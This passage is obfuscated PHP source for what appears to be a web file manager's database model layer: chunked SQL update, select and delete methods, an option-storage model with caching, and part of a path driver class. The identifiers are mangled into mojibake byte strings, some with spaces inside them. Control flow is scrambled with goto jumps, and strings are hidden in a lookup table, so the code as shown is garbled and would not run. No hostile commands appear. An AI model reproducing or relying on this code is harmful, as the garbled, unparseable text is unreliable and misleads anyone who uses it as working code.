unset($f≤ú’√ÀßÉ[$EÖΩä“Œüì]); } break; case $B°Ë∆¿‰é›[308]: $f≤ú’√ÀßÉ[$EÖΩä“Œüì] = $báË∫‹ï‘è[1]; default: break; } } if ($aå†ﬂÈ¡≤î == $B°Ë∆¿‰é›[340]) { $f•Âä◊Á—Ó = strtolower($this->db->getDbType()); if (strpos($f•Âä◊Á—Ó, $B°Ë∆¿‰é›[9]) !== 0) { return; } $A‹õñπµ‚‘ = $this->field(!0)->fields; $f∏ ≠≤¬¨¬ = $A‹õñπµ‚‘[$B°Ë∆¿‰é›[236]]; if (isset($A‹õñπµ‚‘[$B°Ë∆¿‰é›[235]])) { unset($f∏ ≠≤¬¨¬[$A‹õñπµ‚‘[$B°Ë∆¿‰é›[235]]]); } foreach ($f∏ ≠≤¬¨¬ as $aË»†…é õ => $aå†ﬂÈ¡≤î) { if (!isset($f≤ú’√ÀßÉ[$aË»†…é õ])) { $f≤ú’√ÀßÉ[$aË»†…é õ] = $B°Ë∆¿‰é›[33]; } } } } private function dataAfterFilter(&$d‡é¶‘‘≠’) { $Bå◊—‰ı¶Î =& $_SERVER[¯èãÄπµ]; foreach ($this->dataAuto as $A”Öœø¡”≠) { $BÈîºÎ€á≈ = $A”Öœø¡”≠[0]; if (!in_array($Bå◊—‰ı¶Î[342], explode($Bå◊—‰ı¶Î[47], $A”Öœø¡”≠[2]))) { continue; } if (!isset($d‡é¶‘‘≠’[$BÈîºÎ€á≈])) { continue; } switch (trim($A”Öœø¡”≠[3])) { case $Bå◊—‰ı¶Î[305]: case $Bå◊—‰ı¶Î[306]: $C¨†§ëˆèÌ = isset($A”Öœø¡”≠[4]) ? (array) $A”Öœø¡”≠[4] : array(); array_unshift($C¨†§ëˆèÌ, $d‡é¶‘‘≠’[$BÈîºÎ€á≈]); if ($Bå◊—‰ı¶Î[305] == $A”Öœø¡”≠[3]) { $d‡é¶‘‘≠’[$BÈîºÎ€á≈] = call_user_func_array($A”Öœø¡”≠[1], $C¨†§ëˆèÌ); } else { $d‡é¶‘‘≠’[$BÈîºÎ€á≈] = call_user_func_array(array(&$this, $A”Öœø¡”≠[1]), $C¨†§ëˆèÌ); } break; case $Bå◊—‰ı¶Î[257]: $d‡é¶‘‘≠’[$BÈîºÎ€á≈] = $d‡é¶‘‘≠’[$A”Öœø¡”≠[1]]; break; case $Bå◊—‰ı¶Î[278]: $còîÎ¶ì∏œ = $d‡é¶‘‘≠’[$BÈîºÎ€á≈]; $d‡é¶‘‘≠’[$BÈîºÎ€á≈] = json_decode($còîÎ¶ì∏œ, !0); if (is_null($d‡é¶‘‘≠’[$BÈîºÎ€á≈])) { $d‡é¶‘‘≠’[$BÈîºÎ€á≈] = $còîÎ¶ì∏œ; } break; case $Bå◊—‰ı¶Î[307]: if ($d‡é¶‘‘≠’[$BÈîºÎ€á≈] === $Bå◊—‰ı¶Î[33]) { unset($d‡é¶‘‘≠’[$BÈîºÎ€á≈]); } break; case $Bå◊—‰ı¶Î[308]: $d‡é¶‘‘≠’[$BÈîºÎ€á≈] = $A”Öœø¡”≠[1]; default: break; } } } public function saveAll($e√ÎÓù∞êí) { goto Aßá∫áﬂˆ©; Aßá∫áﬂˆ©: $DÕ–÷úêÈ’ =& $_SERVER[¯èãÄπµ]; $báæ≥∫’í∏ = $this->tablePrefix . $this->tableName; $E¿◊ﬂÇ Éñ = self::SQL_WHERE_IN_CHUNK; goto CŸìß∫’èì; FÆ≤èùŸ©é: $this->chunkEventSet(); goto F±åë¯±Î÷; fπèèø∏‚’: $FäªÎ–Ú¢æ = array(); $añã‡æÚã∏ = count($e√ÎÓù∞êí); for ($dö´«ﬁ¯Ú¯ = 0; $dö´«ﬁ¯Ú¯ < $añã‡æÚã∏; $dö´«ﬁ¯Ú¯++) { $E©–ﬂí“Ó¨ = $e√ÎÓù∞êí[$dö´«ﬁ¯Ú¯]; if (!is_array($E©–ﬂí“Ó¨) || count($E©–ﬂí“Ó¨) != 4) { continue; } $CµÏ››ˆË√ = "\125\120\x44\101\124\x45\40{$báæ≥∫’í∏}\40\x53\105\x54\40{$E©–ﬂí“Ó¨[2]}\40\x3d\40\x43\101\x53\x45\40{$E©–ﬂí“Ó¨[0]}\x20\12"; if ($fù¥ùﬁåΩˆ == 0) { $B€ñßÌ”Á  = $CµÏ››ˆË√; } $FäªÎ–Ú¢æ[] = $DÕ–÷úêÈ’[112] . $E©–ﬂí“Ó¨[1] . $DÕ–÷úêÈ’[112]; $fù¥ùﬁåΩˆ++; $B€ñßÌ”Á  .= "\x20\127\110\105\116\x20\x27{$E©–ﬂí“Ó¨[1]}\47\x20\124\x48\105\116\x20\x27{$E©–ﬂí“Ó¨[3]}\x27\x20\xa"; if ($fù¥ùﬁåΩˆ == $E¿◊ﬂÇ Éñ || $dö´«ﬁ¯Ú¯ == $añã‡æÚã∏ - 1) { goto C‚¶Ó±Íà⁄; C‚¶Ó±Íà⁄: $b‘°ÕÚ Í° = implode($DÕ–÷úêÈ’[47], $FäªÎ–Ú¢æ); $B€ñßÌ”Á  .= "\x20\x45\x4e\x44\x20\x20\x57\x48\105\x52\x45\40{$E©–ﬂí“Ó¨[0]}\40\x49\x4e\40\x28{$b‘°ÕÚ Í°}\x29\40"; $this->execute($B€ñßÌ”Á ); goto bò®’ç…ñ¨; bò®’ç…ñ¨: $fù¥ùﬁåΩˆ = 0; $B€ñßÌ”Á  = $CµÏ››ˆË√; $this->chunkEventCheck(count($FäªÎ–Ú¢æ)); goto bÆÁÂ°èÏÿ; bÆÁÂ°èÏÿ: $FäªÎ–Ú¢æ = array(); goto cí´õ¿¡Ω¥; cí´õ¿¡Ω¥: } } goto FÆ≤èùŸ©é; CŸìß∫’èì: $e√ÎÓù∞êí = is_array($e√ÎÓù∞êí) ? $e√ÎÓù∞êí : array(); $B€ñßÌ”Á  = $DÕ–÷úêÈ’[357]; $fù¥ùﬁåΩˆ = 0; goto fπèèø∏‚’; F±åë¯±Î÷: } public function saveAllEach($Fï·‹¿é·‡) { $eÂ∆ì≠†ü‡ =& $_SERVER[¯èãÄπµ]; $aÕàåòêóÖ = $this->tablePrefix . $this->tableName; foreach ($Fï·‹¿é·‡ as $aëÇ√§⁄ëÆ) { if (!is_array($aëÇ√§⁄ëÆ) || count($aëÇ√§⁄ëÆ) != 4) { continue; } $Eá›ÎÊı∑ú = $aëÇ√§⁄ëÆ[0] . $eÂ∆ì≠†ü‡[358] . $aëÇ√§⁄ëÆ[1] . $eÂ∆ì≠†ü‡[112]; $dıÈÁˆ∏ó∆ = $aëÇ√§⁄ëÆ[2] . $eÂ∆ì≠†ü‡[358] . $aëÇ√§⁄ëÆ[3] . $eÂ∆ì≠†ü‡[112]; $DÔ√∏√èêó = "\165\160\144\141\x74\x65\x20{$aÕàåòêóÖ}\40\x73\145\x74\40{$dıÈÁˆ∏ó∆}\40\x77\x68\x65\162\145\40{$Eá›ÎÊı∑ú}\73"; $this->execute($DÔ√∏√èêó); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($eÊöπ•äå¡ = false, $EêÀÛäÙ©· = false) { $this->_chunkEvent = $eÊöπ•äå¡; $this->_chunkEventParam = $EêÀÛäÙ©·; } private function chunkEventCheck($aòÜèêúâ¢) { if (!$this->_chunkEvent) { return; } $B°ßıÇçÒÔ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $B°ßıÇçÒÔ[$_SERVER[¯èãÄπµ][359]] = $aòÜèêúâ¢; Hook::trigger($this->_chunkEvent, $B°ßıÇçÒÔ); } public function addAll($Bªãıä›• , $D¢Ñ›¢ºåÙ = array(), $A—†ÚëØ—´ = false) { goto Cæ ûë…Îì; Cæ ûë…Îì: $a¡üﬂ⁄∏ÇÛ =& $_SERVER[¯èãÄπµ]; ignore_timeout(); $fîá¨∆èØÙ = self::SQL_WHERE_IN_CHUNK; goto Fî‡ô“ÿ¨…; Fî‡ô“ÿ¨…: if (empty($Bªãıä›• )) { $this->error = think_lang($a¡üﬂ⁄∏ÇÛ[255]); return !1; } $D¢Ñ›¢ºåÙ = $this->_parseOptions($D¢Ñ›¢ºåÙ); foreach ($Bªãıä›•  as $DÙ‹ôÃ≈∆ç => $D·—·ä¶©À) { $Bªãıä›• [$DÙ‹ôÃ≈∆ç] = $this->_facade($D·—·ä¶©À); $this->_beforeInsert($Bªãıä›• [$DÙ‹ôÃ≈∆ç], $D¢Ñ›¢ºåÙ); } goto F∑Õ≈…Ûê÷; F∑Õ≈…Ûê÷: if (method_exists($this->db, $a¡üﬂ⁄∏ÇÛ[256])) { for ($C›áØœÉµÈ = 0; $C›áØœÉµÈ < count($Bªãıä›• ); $C›áØœÉµÈ += $fîá¨∆èØÙ) { $aÿ€üô÷â÷ = array_slice($Bªãıä›• , $C›áØœÉµÈ, $fîá¨∆èØÙ); if (!is_array($aÿ€üô÷â÷) || count($aÿ€üô÷â÷) == 0) { break; } $có´÷ÙÎŸ‹ = $this->db->insertAll($aÿ€üô÷â÷, $D¢Ñ›¢ºåÙ, $A—†ÚëØ—´); $this->chunkEventCheck(count($aÿ€üô÷â÷)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Bªãıä›•  as $DÙ‹ôÃ≈∆ç => $D·—·ä¶©À) { $có´÷ÙÎŸ‹ = $this->db->insert($D·—·ä¶©À, $D¢Ñ›¢ºåÙ, $A—†ÚëØ—´); } $this->commit(); } if (!1 !== $có´÷ÙÎŸ‹) { $Bˆäëê≥’® = $this->getLastInsID(); if ($Bˆäëê≥’®) { return $Bˆäëê≥’®; } } return $có´÷ÙÎŸ‹; goto D«ùÜÇ »£; D«ùÜÇ »£: } public function save($EﬂıÖùäÑÈ = '', $FÁï«ø„«ß = array()) { goto Céøàœ¿Ê∫; Céøàœ¿Ê∫: $a˜™¨·çÇ© =& $_SERVER[¯èãÄπµ]; $F»ÇèÖáÌ = self::SQL_WHERE_IN_CHUNK; $cßÈîÛ≤°∆ = $this->optionsValue(); goto cÒÿçºÀµÍ; cåÁ§§ÑΩ»: for ($d≠ë¢≈ãÀú = 0; $d≠ë¢≈ãÀú < $DˆÇ™å…≈∏; $d≠ë¢≈ãÀú += $F»ÇèÖáÌ) { $Bü›á¶≠©ó = array_slice($fø–ﬁÑÁΩç, $d≠ë¢≈ãÀú, $F»ÇèÖáÌ); if (!is_array($Bü›á¶≠©ó) || count($Bü›á¶≠©ó) == 0) { break; } $cßÈîÛ≤°∆[$a˜™¨·çÇ©[259]][$CÃâ©ÁØÜÎ][1] = $Bü›á¶≠©ó; $this->optionsValue($cßÈîÛ≤°∆); $D‚Ô—‹ÿíÍ += parent::save($EﬂıÖùäÑÈ, $FÁï«ø„«ß); $this->chunkEventCheck(count($Bü›á¶≠©ó)); } $this->chunkEventSet(); return $D‚Ô—‹ÿíÍ; goto d‡æ¡Œ‡Ô≤; FõÜÚ˜Ïãà: $fø–ﬁÑÁΩç = $cßÈîÛ≤°∆[$a˜™¨·çÇ©[259]][$CÃâ©ÁØÜÎ][1]; $fø–ﬁÑÁΩç = is_array($fø–ﬁÑÁΩç) ? $fø–ﬁÑÁΩç : array(); $DˆÇ™å…≈∏ = count($fø–ﬁÑÁΩç); goto cåÁ§§ÑΩ»; cÒÿçºÀµÍ: $CÃâ©ÁØÜÎ = $this->findWhereField($cßÈîÛ≤°∆); if (!$CÃâ©ÁØÜÎ) { return parent::save($EﬂıÖùäÑÈ, $FÁï«ø„«ß); } $D‚Ô—‹ÿíÍ = 0; goto FõÜÚ˜Ïãà; d‡æ¡Œ‡Ô≤: } public function add($A“¥Úõ‹‚™ = '', $BŸª«™¯Õ˘ = array(), $aÑÔâïÜÒÉ = false) { if ($this->addTaskStatus && is_array($A“¥Úõ‹‚™)) { $this->addTaskData[] = $A“¥Úõ‹‚™; return; } return parent::add($A“¥Úõ‹‚™, $BŸª«™¯Õ˘, $aÑÔâïÜÒÉ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Fë◊›€µë— = array()) { goto fî£π∑π«ô; fî£π∑π«ô: $dê∫òÔΩœﬁ =& $_SERVER[¯èãÄπµ]; $D◊®¬ÎÍé≠ = self::SQL_WHERE_IN_CHUNK; $aê€ŸöÇåÜ = $this->optionsValue(); goto aêÛ¥ÿæâø; d…è˘ó±Ïï: $a¨ÖåÂ»´Û = is_array($a¨ÖåÂ»´Û) ? $a¨ÖåÂ»´Û : array(); $cèÍ˘ÿΩ¢ª = null; for ($e·Ü—¢îıï = 0; $e·Ü—¢îıï < count($a¨ÖåÂ»´Û); $e·Ü—¢îıï += $D◊®¬ÎÍé≠) { $dåŒŒôŒ˜ÿ = array_slice($a¨ÖåÂ»´Û, $e·Ü—¢îıï, $D◊®¬ÎÍé≠); if (!is_array($dåŒŒôŒ˜ÿ) || count($dåŒŒôŒ˜ÿ) == 0) { break; } $aê€ŸöÇåÜ[$dê∫òÔΩœﬁ[259]][$AÇ¨™‘µÇÚ][1] = $dåŒŒôŒ˜ÿ; $this->optionsValue($aê€ŸöÇåÜ); $C»˜Üº¿É£ = parent::select($Fë◊›€µë—); if (!$C»˜Üº¿É£) { continue; } if (is_null($cèÍ˘ÿΩ¢ª)) { $cèÍ˘ÿΩ¢ª = array(); } $cèÍ˘ÿΩ¢ª = array_merge($cèÍ˘ÿΩ¢ª, $C»˜Üº¿É£); } goto dÔ“˘Çßõû; aêÛ¥ÿæâø: $AÇ¨™‘µÇÚ = $this->findWhereField($aê€ŸöÇåÜ); if (!$AÇ¨™‘µÇÚ || isset($aê€ŸöÇåÜ[$dê∫òÔΩœﬁ[276]]) || isset($aê€ŸöÇåÜ[$dê∫òÔΩœﬁ[336]])) { return parent::select($Fë◊›€µë—); } $a¨ÖåÂ»´Û = $aê€ŸöÇåÜ[$dê∫òÔΩœﬁ[259]][$AÇ¨™‘µÇÚ][1]; goto d…è˘ó±Ïï; dÔ“˘Çßõû: return $cèÍ˘ÿΩ¢ª; goto aÁ¶™õŒãÃ; aÁ¶™õŒãÃ: } public function delete($A»≈ñéè¨ß = array()) { goto Aã…ˆâéß§; D‹∂¡ñÀø∑: $CÁÿ¨‚áı° = $c¯ññêÙù€[$EˆÓ∑é‘ûπ[259]][$CØ™é©ãéô][1]; $CÁÿ¨‚áı° = is_array($CÁÿ¨‚áı°) ? $CÁÿ¨‚áı° : array(); for ($Fßã˘’•ü≤ = 0; $Fßã˘’•ü≤ < count($CÁÿ¨‚áı°); $Fßã˘’•ü≤ += $A•ëº”ÎΩí) { $cÒõ–êË…÷ = array_slice($CÁÿ¨‚áı°, $Fßã˘’•ü≤, $A•ëº”ÎΩí); if (!is_array($cÒõ–êË…÷) || count($cÒõ–êË…÷) == 0) { break; } $c¯ññêÙù€[$EˆÓ∑é‘ûπ[259]][$CØ™é©ãéô][1] = $cÒõ–êË…÷; $this->optionsValue($c¯ññêÙù€); $cÒ±Õº¶¢ı += parent::delete($A»≈ñéè¨ß); } goto aÉëª“åëû; aÉëª“åëû: return $cÒ±Õº¶¢ı; goto EÉ«Ω ÒÚà; Aã…ˆâéß§: $EˆÓ∑é‘ûπ =& $_SERVER[¯èãÄπµ]; $A•ëº”ÎΩí = self::SQL_WHERE_IN_CHUNK; $c¯ññêÙù€ = $this->optionsValue(); goto F˜®«Öæ“§; F˜®«Öæ“§: $CØ™é©ãéô = $this->findWhereField($c¯ññêÙù€); if (!$CØ™é©ãéô) { return parent::delete($A»≈ñéè¨ß); } $cÒ±Õº¶¢ı = 0; goto D‹∂¡ñÀø∑; EÉ«Ω ÒÚà: } private function findWhereField($C»‚Ú„àà¯) { $Eö·î§ò«Ú =& $_SERVER[¯èãÄπµ]; $fÕ®£≥Òå¥ = self::SQL_WHERE_IN_CHUNK; if (!is_array($C»‚Ú„àà¯) || !is_array($C»‚Ú„àà¯[$Eö·î§ò«Ú[259]])) { return !1; } foreach ($C»‚Ú„àà¯[$Eö·î§ò«Ú[259]] as $EÈÉ™⁄É£ê => $f∂Ç∑êÇÃﬁ) { if (is_array($f∂Ç∑êÇÃﬁ) && isset($f∂Ç∑êÇÃﬁ[0]) && is_string($f∂Ç∑êÇÃﬁ[0]) && strtolower($f∂Ç∑êÇÃﬁ[0]) == $Eö·î§ò«Ú[7] && is_array($f∂Ç∑êÇÃﬁ[1]) && count($f∂Ç∑êÇÃﬁ[1]) > $fÕ®£≥Òå¥) { ignore_timeout(); return $EÈÉ™⁄É£ê; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\x6d\117\160\x74\x69\x6f\156"; public $field = array(); public function listData($a€ﬂíô¢ªŒ = false, $D–¡≤ÙÔç† = "\155\157\144\x69\x66\171\124\x69\155\x65", $F◊Í”πﬁË¢ = false) { $DŒÌ€∂ıÉ° = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$DŒÌ€∂ıÉ°) { return $a€ﬂíô¢ªŒ ? null : array(); } if (!$a€ﬂíô¢ªŒ) { $DŒÌ€∂ıÉ° = array_filter(array_values($DŒÌ€∂ıÉ°)); return array_sort_by($DŒÌ€∂ıÉ°, $D–¡≤ÙÔç†, $F◊Í”πﬁË¢); } return $DŒÌ€∂ıÉ°[$_SERVER[¯èãÄπµ][360] . $a€ﬂíô¢ªŒ]; } public function insert($AâÖ¥ﬁﬁË©) { goto F°ÒÖ˜™ıÏ; aÇæ˘º±¿ƒ: return $B⁄Ñ¯ú¥œã; goto fÊò–øÓÌ®; aûæ‡∂ÜåÙ: $AâÖ¥ﬁﬁË©[$f∞÷∂™∂Ç—[106]] = time(); Model($this->modelType)->set($f∞÷∂™∂Ç—[361], $B⁄Ñ¯ú¥œã, $this->optionType . $f∞÷∂™∂Ç—[362]); Model($this->modelType)->set($f∞÷∂™∂Ç—[360] . $B⁄Ñ¯ú¥œã, $AâÖ¥ﬁﬁË©, $this->optionType); goto aÇæ˘º±¿ƒ; EÒÎ∂ÉÔåê: $B⁄Ñ¯ú¥œã = $B⁄Ñ¯ú¥œã ? $B⁄Ñ¯ú¥œã : 0; $AâÖ¥ﬁﬁË©[$f∞÷∂™∂Ç—[363]] = ++$B⁄Ñ¯ú¥œã; $AâÖ¥ﬁﬁË©[$f∞÷∂™∂Ç—[183]] = time(); goto aûæ‡∂ÜåÙ; F°ÒÖ˜™ıÏ: $f∞÷∂™∂Ç— =& $_SERVER[¯èãÄπµ]; $AâÖ¥ﬁﬁË© = array_field_key($AâÖ¥ﬁﬁË©, $this->field); $B⁄Ñ¯ú¥œã = Model($this->modelType)->get($f∞÷∂™∂Ç—[361], $this->optionType . $f∞÷∂™∂Ç—[362]); goto EÒÎ∂ÉÔåê; fÊò–øÓÌ®: } public function update($Cã«æ©æå≥, $aïËøêÆï§) { goto EÒèóæ¶âë; e–òÛØÜÌÆ: if (!$e©ìÙ©é«Æ) { return !1; } $aïËøêÆï§ = array_merge($e©ìÙ©é«Æ, $aïËøêÆï§); $aïËøêÆï§[$aà¡Ω∆•í[106]] = time(); goto A€î·èâÆ¯; EÒèóæ¶âë: $aà¡Ω∆•í =& $_SERVER[¯èãÄπµ]; $aïËøêÆï§ = array_field_key($aïËøêÆï§, $this->field); $e©ìÙ©é«Æ = $this->listData($Cã«æ©æå≥); goto e–òÛØÜÌÆ; A€î·èâÆ¯: return Model($this->modelType)->set($aà¡Ω∆•í[360] . $Cã«æ©æå≥, $aïËøêÆï§, $this->optionType); goto a¶π≤üÿ—ƒ; a¶π≤üÿ—ƒ: } public function remove($fÿÏº»ñèá) { return Model($this->modelType)->remove($_SERVER[¯èãÄπµ][360] . $fÿÏº»ñèá, $this->optionType); } public function clear() { $c∏ÿÆºÏØá =& $_SERVER[¯èãÄπµ]; Model($this->modelType)->remove($c∏ÿÆºÏØá[361], $this->optionType . $c∏ÿÆºÏØá[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Eœ§ØàÉ å, $DÓΩƒ„è´±) { if (!$DÓΩƒ„è´±) { return !1; } $båÎªıËêì = $this->listData(); $båÎªıËêì = array_to_keyvalue($båÎªıËêì, $Eœ§ØàÉ å); return isset($båÎªıËêì[$DÓΩƒ„è´±]) ? $båÎªıËêì[$DÓΩƒ„è´±] : !1; } public function findByName($EòŒ£∏µºÇ) { return $this->findByKey($_SERVER[¯èãÄπµ][28], $EòŒ£∏µºÇ); } protected function resetData($a™Èô‚∫⁄ô) { $eó›ÑÆ°∑ó =& $_SERVER[¯èãÄπµ]; $a™Èô‚∫⁄ô = is_array($a™Èô‚∫⁄ô) ? $a™Èô‚∫⁄ô : array(); $E≈≥≤‘å†Û = array(); for ($c≤Â˘÷ö‡á = 0; $c≤Â˘÷ö‡á < count($a™Èô‚∫⁄ô); $c≤Â˘÷ö‡á++) { $E≈≥≤‘å†Û[$eó›ÑÆ°∑ó[360] . $a™Èô‚∫⁄ô[$c≤Â˘÷ö‡á][$eó›ÑÆ°∑ó[363]]] = $a™Èô‚∫⁄ô[$c≤Â˘÷ö‡á]; } return Model($this->modelType)->set($E≈≥≤‘å†Û, !1, $this->optionType); } private function getAutoName($BÚÍæ°éòù) { $cô‚Ö”≥ıà = array_to_keyvalue($this->listData(), $_SERVER[¯èãÄπµ][28]); if (!$cô‚Ö”≥ıà || !isset($cô‚Ö”≥ıà[$BÚÍæ°éòù])) { return $BÚÍæ°éòù; } for ($d§ªŸ‹¯ñÇ = 1; $d§ªŸ‹¯ñÇ < count($cô‚Ö”≥ıà); $d§ªŸ‹¯ñÇ++) { $fÂ’≠π—Ñ› = $BÚÍæ°éòù . "\x28{$d§ªŸ‹¯ñÇ}\x29"; if (!isset($cô‚Ö”≥ıà[$fÂ’≠π—Ñ›])) { return $fÂ’≠π—Ñ›; } } return $fÂ’≠π—Ñ›; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($CËë‚…®ƒ™ = false, $FÇ£‘£âÉ“ = '', $dÎ€◊ÛÖÜ = false) { goto aæﬁﬂÔÙé; a≠¯£≥†ï : $A‹ß›éﬂº = is_array($A‹ß›éﬂº) ? $A‹ß›éﬂº : array(); if (is_array($c¡ÿµÙ‡¿¯)) { $c¡ÿµÙ‡¿¯ = array_merge($A‹ß›éﬂº, $c¡ÿµÙ‡¿¯); return $CËë‚…®ƒ™ ? isset($c¡ÿµÙ‡¿¯[$CËë‚…®ƒ™]) ? $c¡ÿµÙ‡¿¯[$CËë‚…®ƒ™] : null : $c¡ÿµÙ‡¿¯; } $bÊÒäí√ÜÒ = $this->filterWhere(array($cï†¢ƒ„Ë¡[29] => $FÇ£‘£âÉ“)); goto E˘†˜„—´√; aæﬁﬂÔÙé: $cï†¢ƒ„Ë¡ =& $_SERVER[¯èãÄπµ]; $c¡ÿµÙ‡¿¯ = $this->cacheGet($FÇ£‘£âÉ“); $A‹ß›éﬂº = $this->optionDefault($FÇ£‘£âÉ“); goto a≠¯£≥†ï ; a¢‘»’£ıÂ: $this->cacheSet($FÇ£‘£âÉ“, $c¡ÿµÙ‡¿¯); $c¡ÿµÙ‡¿¯ = array_merge($A‹ß›éﬂº, $c¡ÿµÙ‡¿¯); return $CËë‚…®ƒ™ ? $c¡ÿµÙ‡¿¯[$CËë‚…®ƒ™] : $c¡ÿµÙ‡¿¯; goto c◊äûŒ¡Ó™; E˘†˜„—´√: $c¡ÿµÙ‡¿¯ = $this->where($bÊÒäí√ÜÒ)->select(); $c¡ÿµÙ‡¿¯ = array_to_keyvalue($c¡ÿµÙ‡¿¯, $cï†¢ƒ„Ë¡[89], $cï†¢ƒ„Ë¡[355]); foreach ($c¡ÿµÙ‡¿¯ as $b∏µÔ≠ä≤´ => $f∆ÖΩå…ƒ) { if ($dÎ€◊ÛÖÜ || in_array($b∏µÔ≠ä≤´, $this->jsonField)) { $c¡ÿµÙ‡¿¯[$b∏µÔ≠ä≤´] = json_decode($f∆ÖΩå…ƒ, !0); } } goto a¢‘»’£ıÂ; c◊äûŒ¡Ó™: } public function set($Eç›öèåí∫, $aá‘à¯êçç = false, $Fœ˜Ó‘è√ = '') { goto fççªá¶¡ﬂ; fççªá¶¡ﬂ: $CÛâüëáƒã =& $_SERVER[¯èãÄπµ]; $this->cacheRemove($Fœ˜Ó‘è√); $A£ﬂ›“Ωâ∆ = array(); goto Cá„àÈÂ∏Ö; Cá„àÈÂ∏Ö: $a∫¥û˜¨úü = is_array($Eç›öèåí∫) ? $Eç›öèåí∫ : array($Eç›öèåí∫ => $aá‘à¯êçç); foreach ($a∫¥û˜¨úü as $cªå˜£∞õà => $Cí£µ¯áè⁄) { if (is_array($Cí£µ¯áè⁄)) { $Cí£µ¯áè⁄ = json_encode_force($Cí£µ¯áè⁄); } $this->checkLength($Cí£µ¯áè⁄, !1, $this->tableName . $CÛâüëáƒã[4] . $Eç›öèåí∫); $Cí£µ¯áè⁄ = self::textEncode($Cí£µ¯áè⁄); $a∫¥û˜¨úü = array($CÛâüëáƒã[29] => $Fœ˜Ó‘è√, $CÛâüëáƒã[89] => $cªå˜£∞õà, $CÛâüëáƒã[355] => $Cí£µ¯áè⁄); $A£ﬂ›“Ωâ∆[] = $this->filterWhere($a∫¥û˜¨úü); } if (!$A£ﬂ›“Ωâ∆) { return !0; } goto döëç¯·∂Ü; döëç¯·∂Ü: return $this->addAll($A£ﬂ›“Ωâ∆, array(), !0); goto Eºó÷úËüÿ; Eºó÷úËüÿ: } protected function optionDefault($E®åæ√‘∞ï = '') { return !1; } public function setDeep($eÍÊ…ì≤§ê, $EùÜÆ¨„éº = false, $fïíõ”°Ì‘ = '') { $Díê©·‡∂Â = explode($_SERVER[¯èãÄπµ][91], $eÍÊ…ì≤§ê); $b£Ü»ﬁ¯∂Ã = $this->get(); array_set_value($b£Ü»ﬁ¯∂Ã, $eÍÊ…ì≤§ê, $EùÜÆ¨„éº); $this->set($Díê©·‡∂Â[0], $b£Ü»ﬁ¯∂Ã[$Díê©·‡∂Â[0]], $fïíõ”°Ì‘); } public function remove($Cﬁ≈Ò©Ì±÷, $c°≈Ø„äπ· = '') { $déôôå»ïë =& $_SERVER[¯èãÄπµ]; $this->cacheRemove($c°≈Ø„äπ·); $Fàˆ‹âÎˆÎ = $this->filterWhere(array($déôôå»ïë[89] => $Cﬁ≈Ò©Ì±÷, $déôôå»ïë[29] => $c°≈Ø„äπ·)); if (is_null($Cﬁ≈Ò©Ì±÷)) { unset($Fàˆ‹âÎˆÎ[$déôôå»ïë[89]]); } return $this->where($Fàˆ‹âÎˆÎ)->delete(); } public function cacheSet($D∆è±ÇÇ˘¥, $DÂÈ∂∑øä£ = false) { return Cache::set($this->cacheKey($D∆è±ÇÇ˘¥), $DÂÈ∂∑øä£); } public function cacheGet($fÈÙ¡«™∫¯) { return Cache::get($this->cacheKey($fÈÙ¡«™∫¯)); } public function cacheRemove($b˜·÷éﬂÍ) { return Cache::remove($this->cacheKey($b˜·÷éﬂÍ)); } protected function filterWhere($Cë Ç•â¯⁄) { return $Cë Ç•â¯⁄; } protected function cacheKey($cüÇÜß◊–·) { return $cüÇÜß◊–·; } } goto eÆ‡åÖ≠Ñ‘; E¬‚ïΩêâ–: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $a◊≈œΩèï⁄ =& $_SERVER[¯èãÄπµ]; $this->objectDriver = array($a◊≈œΩèï⁄[57], $a◊≈œΩèï⁄[58], $a◊≈œΩèï⁄[59], $a◊≈œΩèï⁄[60], $a◊≈œΩèï⁄[61], $a◊≈œΩèï⁄[62], $a◊≈œΩèï⁄[63], $a◊≈œΩèï⁄[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($A∂ Ëî±è¯) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($A∂ Ëî±è¯, $_SERVER[¯èãÄπµ][8]); } return $A∂ Ëî±è¯; } public function getPathName($fóø˘«Æ‘¶) { return $fóø˘«Æ‘¶; } public function iconvApp($c‰Ø◊§Ëƒß) { return $c‰Ø◊§Ëƒß; } public function iconvSystem($cè’±ßÓøÉ) { return $cè’±ßÓøÉ; } public function iconvTo($c¶ﬂ©Íìò‡, $FŸﬂ∆ãπâÓ, $C‚ªÌåÇŒŒ) { goto cô«ıı ÛÛ; cô«ıı ÛÛ: $f£›Œ®¡ƒÔ =& $_SERVER[¯èãÄπµ]; if (!$c¶ﬂ©Íìò‡ || !function_exists($f£›Œ®¡ƒÔ[65])) { return $c¶ﬂ©Íìò‡; } static $AÂ‡ÂÆ∞´å = array(); goto féº‚ÿç°⁄; E≠©„è§àà: return $céóˆ¢êéÍ; goto b≥ €≥¬„ã; FÖÓ“â‹·Ü: $céóˆ¢êéÍ = $céóˆ¢êéÍ ? $céóˆ¢êéÍ : $c¶ﬂ©Íìò‡; if (strstr($céóˆ¢êéÍ, $f£›Œ®¡ƒÔ[69])) { $céóˆ¢êéÍ = str_replace($f£›Œ®¡ƒÔ[69], $f£›Œ®¡ƒÔ[70], $céóˆ¢êéÍ); } $AÂ‡ÂÆ∞´å[$FŸﬂ∆ãπâÓ . $f£›Œ®¡ƒÔ[66] . $C‚ªÌåÇŒŒ . $f£›Œ®¡ƒÔ[67] . $c¶ﬂ©Íìò‡] = $céóˆ¢êéÍ; goto dõæ∞˜†˘‰; dõæ∞˜†˘‰: $AÂ‡ÂÆ∞´å[$C‚ªÌåÇŒŒ . $f£›Œ®¡ƒÔ[66] . $FŸﬂ∆ãπâÓ . $f£›Œ®¡ƒÔ[67] . $c¶ﬂ©Íìò‡] = $c¶ﬂ©Íìò‡; 